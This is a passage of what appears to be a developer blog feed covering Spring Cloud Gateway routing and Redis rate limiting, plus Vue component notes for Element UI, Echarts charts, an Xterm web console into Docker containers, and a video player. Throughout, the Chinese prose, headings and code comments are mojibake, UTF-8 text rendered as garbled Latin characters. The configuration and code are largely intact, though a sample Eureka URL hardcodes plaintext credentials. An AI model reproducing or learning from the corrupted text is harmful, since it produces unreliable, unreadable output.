<span class="hljs-attr">defaultZone</span>: <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre></li><li><p>ä½¿ç”¨æ³¨å†Œåˆ°eurekaä¸­çš„æœåŠ¡åæ›¿æ¢ipåœ°å€</p><blockquote><p>lbä»£è¡¨ä½¿ç”¨è´Ÿè½½å‡è¡¡æ¨¡å¼ï¼Œé»˜è®¤ç­–ç•¥æ—¶è½®è¯¢</p></blockquote><pre><code class="hljs yaml"><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span><span class="hljs-attr">spring:</span>  <span class="hljs-attr">application:</span>    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway</span>  <span class="hljs-attr">main:</span>    <span class="hljs-attr">web-application-type:</span> <span class="hljs-string">reactive</span>  <span class="hljs-attr">cloud:</span>    <span class="hljs-attr">gateway:</span>      <span class="hljs-attr">routes:</span>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-login</span>          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://api-user-login</span>          <span class="hljs-comment">#uri: http://127.0.0.1:8001</span>          <span class="hljs-attr">predicates:</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/login</span>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-regist</span>          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://api-user-regist</span>          <span class="hljs-attr">predicates:</span>             <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/regist</span><span class="hljs-attr">eureka:</span>  <span class="hljs-attr">client:</span>    <span class="hljs-attr">service-url:</span>      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre></li></ul></li></ul><h3 id="Gatewayé™æµ"><a href="#Gatewayé™æµ" class="headerlink" title="Gatewayé™æµ"></a>Gatewayé™æµ</h3><blockquote><p>åŸºäºä»¤ç‰Œæ¡¶å®ç°çš„ç½‘å…³é™æµï¼Œä½¿ç”¨redisä½œä¸ºæ¡¶ç»“åˆè¿‡æ»¤å™¨å®ç°é™æµ</p></blockquote><ul><li><p>æ·»åŠ ä¾èµ–</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis-reactive<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-pool2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></li><li><p>é…ç½®application.yml</p><pre><code class="hljs yaml"><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span><span class="hljs-attr">spring:</span>  <span class="hljs-attr">application:</span>    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway</span>  <span class="hljs-attr">main:</span>    <span class="hljs-attr">web-application-type:</span> <span class="hljs-string">reactive</span>  <span class="hljs-attr">cloud:</span>    <span class="hljs-attr">gateway:</span>      <span class="hljs-attr">routes:</span>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-login</span>          <span class="hljs-attr">uri:</span> <span class="hljs-string">http://127.0.0.1:8001</span><span class="hljs-comment">#          uri: lb://api-user-login</span>          <span class="hljs-attr">predicates:</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/login</span>           <span class="hljs-comment">#é™æµç­–ç•¥é…ç½®</span>          <span class="hljs-attr">filters:</span>            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">RequestRateLimiter</span>              <span class="hljs-attr">args:</span>                <span class="hljs-attr">redis-rate-limiter.replenishRate:</span> <span class="hljs-number">1</span> <span class="hljs-comment">#ä»¤ç‰Œæ¡¶æ¯sçš„å¡«å……é€Ÿåº¦</span>                <span class="hljs-attr">redis-rate-limiter.burstCapacity:</span> <span class="hljs-number">2</span> <span class="hljs-comment"># ä»¤ç‰Œæ¡¶å®¹é‡</span>                <span class="hljs-attr">redis-rate-limiter.requestedTokens:</span> <span class="hljs-number">1</span>                <span class="hljs-attr">key-resolver:</span> <span class="hljs-string">&quot;#&#123;@keyResolver&#125;&quot;</span>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-regist</span>          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://api-user-regist</span>          <span class="hljs-attr">predicates:</span>             <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/regist</span>  <span class="hljs-attr">redis:</span>    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>    <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>    <span class="hljs-attr">database:</span> <span class="hljs-number">0</span>    <span class="hljs-attr">password:</span><span class="hljs-comment">#    lettuce:</span><span class="hljs-comment">#      pool:</span><span class="hljs-comment">#        max-active: 10</span><span class="hljs-comment">#        max-wait: 1000</span><span class="hljs-comment">#        max-idle: 5</span><span class="hljs-comment">#        min-idle: 3</span><span class="hljs-attr">eureka:</span>  <span class="hljs-attr">client:</span>    <span class="hljs-attr">service-url:</span>      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre></li><li><p>é…ç½®keyResolver</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.gateway.config;<span class="hljs-keyword">import</span> org.springframework.cloud.gateway.filter.ratelimit.KeyResolver;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<span class="hljs-keyword">import</span> reactor.core.publisher.Mono;<span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppConfig</span> </span>&#123;    <span class="hljs-meta">@Bean</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> KeyResolver <span class="hljs-title">keyResolver</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-comment">//http://localhost:9999/order/query?user=1</span>        <span class="hljs-comment">//ä½¿â½¤è¯·æ±‚ä¸­çš„userå‚æ•°çš„å€¼ä½œä¸ºä»¤ç‰Œæ¡¶çš„key</span>        <span class="hljs-comment">//return exchange -&gt;Mono.just(exchange.getRequest().getQueryParams().getFirst(&quot;user&quot;));</span>        <span class="hljs-keyword">return</span> exchange -&gt;                Mono.just(exchange.getRequest().getURI().getPath());    &#125;&#125;</code></pre></li></ul><p>å½“ç”¨æˆ·è®¿é—®çš„é€Ÿåº¦è¶…è¿‡äº†ä»¤ç‰Œçš„äº§ç”Ÿé€Ÿåº¦æ—¶å°±ä¼šæ— æ³•è®¿é—®ï¼Œè¿”å›429çš„çŠ¶æ€ç </p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220731190403002.png" alt="image-20220731190403002"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>vue_component</title>
    <link href="/2022/05/26/vue-component/"/>
    <url>/2022/05/26/vue-component/</url>
    
    <content type="html"><![CDATA[<h1 id="Vueç»„ä»¶"><a href="#Vueç»„ä»¶" class="headerlink" title="Vueç»„ä»¶"></a>Vueç»„ä»¶</h1><p>åšé¡¹ç›®ä¸­ä½¿ç”¨åˆ°çš„vueç»„ä»¶ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä»¥åä½¿ç”¨åˆ°æ—¶ç›´æ¥å¤åˆ¶å³å¯</p><h2 id="Element-UI"><a href="#Element-UI" class="headerlink" title="Element UI"></a>Element UI</h2><h3 id="è¿›å…¥é¡¹ç›®ç›®å½•ï¼Œå®‰è£…ä¾èµ–"><a href="#è¿›å…¥é¡¹ç›®ç›®å½•ï¼Œå®‰è£…ä¾èµ–" class="headerlink" title="è¿›å…¥é¡¹ç›®ç›®å½•ï¼Œå®‰è£…ä¾èµ–"></a>è¿›å…¥é¡¹ç›®ç›®å½•ï¼Œå®‰è£…ä¾èµ–</h3><pre><code class="hljs sh">npm install element-ui -S</code></pre><p>å®‰è£…æˆåŠŸåï¼ŒæŸ¥çœ‹é…ç½®æ–‡ä»¶<code>package.json</code>ï¼Œæ˜¯å¦æœ‰element-uiç»„ä»¶çš„ç‰ˆæœ¬å· å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526152216904.png" alt="image-20220526152216904"></p><h3 id="åœ¨main-jsæ–‡ä»¶ä¸­-å¼•å…¥-element-ç»„ä»¶"><a href="#åœ¨main-jsæ–‡ä»¶ä¸­-å¼•å…¥-element-ç»„ä»¶" class="headerlink" title="åœ¨main.jsæ–‡ä»¶ä¸­ å¼•å…¥ element ç»„ä»¶"></a>åœ¨main.jsæ–‡ä»¶ä¸­ å¼•å…¥ element ç»„ä»¶</h3><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> ElementUI <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span>;<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;Vue.use(ElementUI, &#123; <span class="hljs-keyword">size</span>: <span class="hljs-string">&quot;mini&quot;</span> &#125;);</code></pre><p>å®Œæˆä»¥ä¸Šä¸¤ä¸ªæ­¥éª¤ï¼Œå³å¯åœ¨é¡¹ç›®ä¸­ä½¿ç”¨element-uiæä¾›çš„ç»„ä»¶äº†</p><h2 id="Echarts"><a href="#Echarts" class="headerlink" title="Echarts"></a>Echarts</h2><h3 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h3><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> echarts -S</code></pre><p>å¦‚æœä¸åŠ ç‰ˆæœ¬å·åˆ™é»˜è®¤å®‰è£…æœ€æ–°ç‰ˆ</p><pre><code class="hljs apache"><span class="hljs-attribute">npm</span> install echarts@<span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> -S</code></pre><p>æ·»åŠ ç‰ˆæœ¬å·ï¼Œå¯ä»¥å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„ä¾èµ–åŒ…ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526152216904.png" alt="image-20220526152216904"></p><p>åœ¨vueæ–‡ä»¶ä¸­ä½¿ç”¨Echarts</p><h3 id="åˆ›å»ºdomç»„ä»¶"><a href="#åˆ›å»ºdomç»„ä»¶" class="headerlink" title="åˆ›å»ºdomç»„ä»¶"></a>åˆ›å»ºdomç»„ä»¶</h3><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pie&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 500px; height: 400px&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre><h3 id="åˆå§‹åŒ–å›¾è¡¨æ•°æ®"><a href="#åˆå§‹åŒ–å›¾è¡¨æ•°æ®" class="headerlink" title="åˆå§‹åŒ–å›¾è¡¨æ•°æ®"></a>åˆå§‹åŒ–å›¾è¡¨æ•°æ®</h3><pre><code class="hljs js"><span class="hljs-keyword">var</span> pieOption = &#123;  title: &#123;    text: <span class="hljs-string">&#x27;å„å­£åº¦ä¼šå‘˜æ•°é‡ç»Ÿè®¡&#x27;</span>,    subtext: <span class="hljs-string">&#x27;æ¯”ä¾‹å›¾&#x27;</span>,    left: <span class="hljs-string">&#x27;center&#x27;</span>  &#125;,  tooltip: &#123;    trigger: <span class="hljs-string">&#x27;item&#x27;</span>  &#125;,  legend: &#123;    orient: <span class="hljs-string">&#x27;vertical&#x27;</span>,    left: <span class="hljs-string">&#x27;left&#x27;</span>  &#125;,  series: [    &#123;      type: <span class="hljs-string">&#x27;pie&#x27;</span>,      radius: <span class="hljs-string">&#x27;60%&#x27;</span>,      label:&#123;            <span class="hljs-comment">//é¥¼å›¾å›¾å½¢ä¸Šçš„æ–‡æœ¬æ ‡ç­¾</span>        normal:&#123;          show:<span class="hljs-literal">true</span>,          position:<span class="hljs-string">&#x27;inner&#x27;</span>, <span class="hljs-comment">//æ ‡ç­¾çš„ä½ç½®</span>          textStyle : &#123;            fontWeight : <span class="hljs-number">300</span> ,            fontSize : <span class="hljs-number">14</span>,    <span class="hljs-comment">//æ–‡å­—çš„å­—ä½“å¤§å°</span>            color: <span class="hljs-string">&quot;#fff&quot;</span>          &#125;,          formatter:<span class="hljs-string">&#x27;&#123;d&#125;%&#x27;</span>        &#125;      &#125;,      data: [],  <span class="hljs-comment">// å¡«ç©º</span>      emphasis: &#123;        itemStyle: &#123;          shadowBlur: <span class="hljs-number">10</span>,          shadowOffsetX: <span class="hljs-number">0</span>,          shadowColor: <span class="hljs-string">&#x27;rgba(0, 0, 0, 0.5)&#x27;</span>        &#125;      &#125;    &#125;  ]&#125;;<span class="hljs-keyword">var</span> pieDom = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;pie&#x27;</span>);<span class="hljs-keyword">var</span> pieChart = echarts.init(pieDom);</code></pre><p>å…¶ä¸­<code>data: [],</code>æ˜¯è¡¨æ ¼æ˜¾ç¤ºçš„æ•°æ®ï¼Œè¿™é‡Œæ˜¯éœ€è¦é‡ç‚¹å®ç°çš„</p><p>è¿™é‡Œå¯ä»¥åœ¨å‰ç«¯é¡µé¢ä¸­å†™æ­»æ•°æ®ï¼Œä½†æ˜¯å¤§å¤šéœ€è¦è¯·æ±‚åç«¯æ¥å£è·å–æ•°æ®ï¼Œå¦‚ä¸‹</p><pre><code class="hljs js"><span class="hljs-built_in">this</span>.request.get(<span class="hljs-string">&quot;/echarts/members&quot;</span>).then(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span>&#123;      pieOption.series[<span class="hljs-number">0</span>].data = [        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;ç¬¬ä¸€å­£åº¦&quot;</span>, <span class="hljs-attr">value</span>: res.data[<span class="hljs-number">0</span>]&#125;,        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;ç¬¬äºŒå­£åº¦&quot;</span>, <span class="hljs-attr">value</span>: res.data[<span class="hljs-number">1</span>]&#125;,        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;ç¬¬ä¸‰å­£åº¦&quot;</span>, <span class="hljs-attr">value</span>: res.data[<span class="hljs-number">2</span>]&#125;,        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;ç¬¬å››å­£åº¦&quot;</span>, <span class="hljs-attr">value</span>: res.data[<span class="hljs-number">3</span>]&#125;,      ]    pieChart.setOption(pieOption);&#125;</code></pre><p>å®ç°æ•ˆæœå›¾</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526155808268.png" alt="image-20220526155808268"></p><h2 id="Xterm"><a href="#Xterm" class="headerlink" title="Xterm"></a>Xterm</h2><p>æ¯•ä¸šè®¾è®¡ä¸­å®ç°äº†åœ¨ç½‘é¡µä¸­è¿›å…¥å®¹å™¨å†…å®¹ï¼Œä¹Ÿå°±æ˜¯<code>docker exec -it containerId bash</code>åŠŸèƒ½</p><p>ä¸webSHHåŠŸèƒ½ç±»ä¼¼</p><h3 id="å®‰è£…ä¾èµ–-1"><a href="#å®‰è£…ä¾èµ–-1" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h3><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> xterm -S</code></pre><p>å®‰è£…ä½¿ç”¨åˆ°çš„æ’ä»¶</p><pre><code class="hljs sh">npm install xterm-addon-attach -Snpm install xterm-addon-fit -S</code></pre><p>æœ¬æ–‡ä½¿ç”¨çš„ç‰ˆæœ¬å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526160612795.png" alt="image-20220526160612795"></p><h3 id="åœ¨é¡µé¢ä¸­å¯¼å…¥ä½¿ç”¨åˆ°çš„åŒ…"><a href="#åœ¨é¡µé¢ä¸­å¯¼å…¥ä½¿ç”¨åˆ°çš„åŒ…" class="headerlink" title="åœ¨é¡µé¢ä¸­å¯¼å…¥ä½¿ç”¨åˆ°çš„åŒ…"></a>åœ¨é¡µé¢ä¸­å¯¼å…¥ä½¿ç”¨åˆ°çš„åŒ…</h3><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;xterm/css/xterm.css&quot;</span>;<span class="hljs-keyword">import</span> &#123; Terminal &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;xterm&quot;</span>;<span class="hljs-keyword">import</span> &#123; FitAddon &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;xterm-addon-fit&quot;</span>;<span class="hljs-keyword">import</span> &#123; AttachAddon &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;xterm-addon-attach&quot;</span>;</code></pre><p>å‰ç«¯æ‰€æœ‰ä»£ç å¦‚ä¸‹</p><pre><code class="hljs vue">&lt;template&gt;  &lt;div class&#x3D;&quot;app-container&quot;&gt;    &lt;el-row &gt;      &lt;h1&gt;Web Console&lt;&#x2F;h1&gt;        &lt;div id&#x3D;&quot;log&quot; style&#x3D;&quot;margin-top:20px;&quot;&gt;          &lt;div class&#x3D;&quot;xterm&quot; id&#x3D;&quot;terminal&quot;&gt;&lt;&#x2F;div&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;el-row&gt;  &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;import &quot;xterm&#x2F;css&#x2F;xterm.css&quot;;import &#123; Terminal &#125; from &quot;xterm&quot;;import &#123; FitAddon &#125; from &quot;xterm-addon-fit&quot;;import &#123; AttachAddon &#125; from &quot;xterm-addon-attach&quot;;export default &#123;  components: &#123;&#125;,  props: &#123;    socketURI: &#123;      type: String,      default: &quot;&quot;    &#125;  &#125;,  data() &#123;    return &#123;      term: null,      socket: null,      rows: 40,      &#x2F;&#x2F; cols: 10,      webSocketUrl: &#39;&#39;, &#x2F;&#x2F;&quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;5e0647ee611b&quot;,      SetOut: false,      isKey: false    &#125;  &#125;,  computed: &#123;&#125;,  watch: &#123;&#125;,  created() &#123;    const id &#x3D; this.$route.query.id    console.log(id)    this.webSocketUrl &#x3D; &quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;&quot; + id  &#125;,  mounted() &#123;    this.initSocket();  &#125;,  beforeDestroy() &#123;    this.socket.close();    &#x2F;&#x2F; this.term.dispose();  &#125;,  methods: &#123;    submitForm() &#123;      this.$refs[&#39;elForm&#39;].validate(valid &#x3D;&gt; &#123;        if (!valid) return        &#x2F;&#x2F; TODO æäº¤è¡¨å•      &#125;)    &#125;,    resetForm() &#123;      this.$refs[&#39;elForm&#39;].resetFields()    &#125;,    &#x2F;&#x2F;Xtermä¸»é¢˜    initTerm(data, callback) &#123;      const term &#x3D; new Terminal(&#123;        rendererType: &quot;canvas&quot;, &#x2F;&#x2F;æ¸²æŸ“ç±»å‹        rows: this.rows, &#x2F;&#x2F;è¡Œæ•°        &#x2F;&#x2F; cols: this.cols,&#x2F;&#x2F; è®¾ç½®ä¹‹åä¼šè¾“å…¥å¤šè¡Œä¹‹åè¦†ç›–ç°è±¡        convertEol: true, &#x2F;&#x2F;å¯ç”¨æ—¶ï¼Œå…‰æ ‡å°†è®¾ç½®ä¸ºä¸‹ä¸€è¡Œçš„å¼€å¤´        &#x2F;&#x2F; scrollback: 10,&#x2F;&#x2F;ç»ˆç«¯ä¸­çš„å›æ»šé‡        fontSize: 14, &#x2F;&#x2F;å­—ä½“å¤§å°        disableStdin: false, &#x2F;&#x2F;æ˜¯å¦åº”ç¦ç”¨è¾“å…¥ã€‚        cursorStyle: &quot;block&quot;, &#x2F;&#x2F;å…‰æ ‡æ ·å¼        cursorBlink: true, &#x2F;&#x2F;å…‰æ ‡é—ªçƒ        scrollback: 30,        tabStopWidth: 8,        theme: &#123;          foreground: &quot;green&quot;, &#x2F;&#x2F;å­—ä½“          background: &quot;#000000&quot;, &#x2F;&#x2F;èƒŒæ™¯è‰²          cursor: &quot;help&quot; &#x2F;&#x2F;è®¾ç½®å…‰æ ‡        &#125;      &#125;);      const attachAddon &#x3D; new AttachAddon(this.socket);      const fitAddon &#x3D; new FitAddon();      term.loadAddon(attachAddon);      term.loadAddon(fitAddon);      term.open(document.getElementById(&quot;terminal&quot;));      fitAddon.fit();      term.focus();      let _this &#x3D; this;      &#x2F;&#x2F;é™åˆ¶å’Œåç«¯äº¤äº’ï¼Œåªæœ‰è¾“å…¥å›è½¦é”®æ‰æ˜¾ç¤ºç»“æœ      term.prompt &#x3D; () &#x3D;&gt; &#123;        term.write(&quot;\r\n$ &quot;);      &#125;;      term.prompt();      function runFakeTerminal(_this) &#123;        if (term._initialized) &#123;          return;        &#125;        &#x2F;&#x2F; åˆå§‹åŒ–        term._initialized &#x3D; true;        term.writeln();&#x2F;&#x2F;æ§åˆ¶å°åˆå§‹åŒ–æŠ¥é”™å¤„        term.prompt();        &#x2F;&#x2F; &#x2F; **        &#x2F;&#x2F;     *æ·»åŠ äº‹ä»¶ç›‘å¬å™¨ï¼Œç”¨äºæŒ‰ä¸‹é”®æ—¶çš„äº‹ä»¶ã€‚äº‹ä»¶å€¼åŒ…å«        &#x2F;&#x2F;     *å°†åœ¨dataäº‹ä»¶ä»¥åŠDOMäº‹ä»¶ä¸­å‘é€çš„å­—ç¬¦ä¸²        &#x2F;&#x2F;     *è§¦å‘äº†å®ƒã€‚        &#x2F;&#x2F;     * @è¿”å›ä¸€ä¸ªIDisposableåœæ­¢ç›‘å¬ã€‚        &#x2F;&#x2F;  * &#x2F;        &#x2F;&#x2F;   &#x2F; ** æ›´æ–°ï¼šxterm 4.xï¼ˆæ–°å¢ï¼‰        &#x2F;&#x2F;  *ä¸ºæ•°æ®äº‹ä»¶è§¦å‘æ—¶æ·»åŠ äº‹ä»¶ä¾¦å¬å™¨ã€‚å‘ç”Ÿè¿™ç§æƒ…å†µ        &#x2F;&#x2F;  *ç”¨æˆ·è¾“å…¥æˆ–ç²˜è´´åˆ°ç»ˆç«¯æ—¶çš„ç¤ºä¾‹ã€‚äº‹ä»¶å€¼        &#x2F;&#x2F;  *æ˜¯&#96;string&#96;ç»“æœçš„ç»“æœï¼Œåœ¨å…¸å‹çš„è®¾ç½®ä¸­ï¼Œåº”è¯¥é€šè¿‡        &#x2F;&#x2F;  *åˆ°æ”¯æŒptyã€‚        &#x2F;&#x2F;  * @è¿”å›ä¸€ä¸ªIDisposableåœæ­¢ç›‘å¬ã€‚        &#x2F;&#x2F;  * &#x2F;        &#x2F;&#x2F; æ”¯æŒè¾“å…¥ä¸ç²˜è´´æ–¹æ³•        term.onData(function(key) &#123;          let order &#x3D; &#123;            Data: key,            Op: &quot;stdin&quot;          &#125;;          _this.onSend(order);        &#125;);        _this.term &#x3D; term;      &#125;      runFakeTerminal(_this);    &#125;,    &#x2F;&#x2F;webShellä¸»é¢˜    initSocket() &#123;      const WebSocketUrl &#x3D; this.webSocketUrl      this.socket &#x3D; new WebSocket(        WebSocketUrl      );      this.socketOnClose(); &#x2F;&#x2F;å…³é—­      this.socketOnOpen(); &#x2F;&#x2F;      this.socketOnError();    &#125;,    &#x2F;&#x2F;webshellé“¾æ¥æˆåŠŸä¹‹åæ“ä½œ    socketOnOpen() &#123;      this.socket.onopen &#x3D; () &#x3D;&gt; &#123;        &#x2F;&#x2F; é“¾æ¥æˆåŠŸå        this.initTerm();      &#125;;    &#125;,    &#x2F;&#x2F;webshellå…³é—­ä¹‹åæ“ä½œ    socketOnClose() &#123;      this.socket.onclose &#x3D; () &#x3D;&gt; &#123;        console.log(&quot;close socket&quot;);      &#125;;    &#125;,    &#x2F;&#x2F;webshellé”™è¯¯ä¿¡æ¯    socketOnError() &#123;      this.socket.onerror &#x3D; () &#x3D;&gt; &#123;        console.log(&quot;socket é“¾æ¥å¤±è´¥&quot;);      &#125;;    &#125;,    &#x2F;&#x2F;ç‰¹æ®Šå¤„ç†    onSend(data) &#123;      data &#x3D; this.base.isObject(data) ? JSON.stringify(data) : data;      data &#x3D; this.base.isArray(data) ? data.toString() : data;      data &#x3D; data.replace(&#x2F;\\\\&#x2F;, &quot;\\&quot;);      this.shellWs.onSend(data);    &#125;,    &#x2F;&#x2F;åˆ é™¤å·¦å³ä¸¤ç«¯çš„ç©ºæ ¼    trim(str) &#123;      return str.replace(&#x2F;(^\s*)|(\s*$)&#x2F;g, &quot;&quot;);    &#125;  &#125;&#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt;</code></pre><p>ä»¥å‰å‰ç«¯ä»£ç åŸºæœ¬ä¸éœ€è¦æ”¹åŠ¨ï¼Œåªéœ€è¦ä¿®æ”¹åç«¯çš„api</p><pre><code class="hljs ini"><span class="hljs-attr">this.webSocketUrl</span> = <span class="hljs-string">&quot;ws://127.0.0.1:8081/terminal?workdir=/&amp;container=&quot;</span> + id</code></pre><p>å°†è¯¥å‚æ•°ä¿®æ”¹ä¸ºåç«¯websocketæ¥å£å³å¯ä½¿ç”¨</p><h2 id="vue-video-player"><a href="#vue-video-player" class="headerlink" title="vue-video-player"></a>vue-video-player</h2><h3 id="å®‰è£…ä¾èµ–-2"><a href="#å®‰è£…ä¾èµ–-2" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h3><pre><code class="hljs sh">npm install vue-video-player@5.0.2 -S</code></pre><h3 id="åœ¨å•æ–‡ä»¶ä¸­ä½¿ç”¨"><a href="#åœ¨å•æ–‡ä»¶ä¸­ä½¿ç”¨" class="headerlink" title="åœ¨å•æ–‡ä»¶ä¸­ä½¿ç”¨"></a>åœ¨å•æ–‡ä»¶ä¸­ä½¿ç”¨</h3><p>é¦–å…ˆå¯¼å…¥ä¾èµ–</p><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; videoPlayer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-video-player/src&#x27;</span>  <span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;video.js/dist/video-js.css&#x27;</span><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;vue-video-player/src/custom-theme.css&#x27;</span><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;  name: <span class="hljs-string">&quot;VideoDetail&quot;</span>,  components: &#123;    videoPlayer  &#125;,</code></pre><p>ä¹‹å‰æ˜¯<code>import &#123; videoPlayer &#125; from &#39;vue-video-player&#39;</code> ï¼ŒæŠ¥é”™ä¿¡æ¯å¦‚ä¸‹</p><pre><code class="hljs subunit"> error  in ./node_modules/vue-video-player/dist/vue-video-player.jsModule not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\Sunzh\java\admin_demo\hello-world\node_modules\vue-video-player\dist&#x27;<span class="hljs-keyword">ERROR </span>in ./node_modules/vue-video-player/dist/vue-video-player.jsModule not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\Sunzh\java\admin_demo\hello-world\node_modules\vue-video-player\dist&#x27; @ ./node_modules/babel-loader/lib/index.js??clonedRuleSet<span class="hljs-string">-40</span>[0].rules[0].use[0]!./node_modules/@vue/vue-loader-v15/lib/index.js??vue-loader-options!./src/views/Detail.vue?vue&amp;type=script&amp;lang=js&amp; 13:0<span class="hljs-string">-47</span> 19:17<span class="hljs-string">-28</span> @ ./src/views/Detail.vue?vue&amp;type=script&amp;lang=js&amp; 1:0<span class="hljs-string">-212</span> 1:228<span class="hljs-string">-231</span> 1:233<span class="hljs-string">-442</span> 1:233<span class="hljs-string">-442</span> @ ./src/views/Detail.vue 2:0<span class="hljs-string">-58</span> 3:0<span class="hljs-string">-53</span> 3:0<span class="hljs-string">-53</span> 9:2<span class="hljs-string">-8</span> @ ./src/router/index.js 82:11<span class="hljs-string">-40</span> @ ./src/main.js 7:0<span class="hljs-string">-30</span> 26:10<span class="hljs-string">-16</span></code></pre><p>å®Œæ•´çš„å‰ç«¯ä»£ç </p><pre><code class="hljs vue">&lt;template&gt;  &lt;div&gt;    &lt;div class&#x3D;&#39;demo&#39;&gt;      &lt;video-player class&#x3D;&quot;video-player-box&quot;                    ref&#x3D;&quot;videoPlayer&quot;                    :playsinline&#x3D;&quot;true&quot;                    :options&#x3D;&quot;playerOptions&quot;&gt;      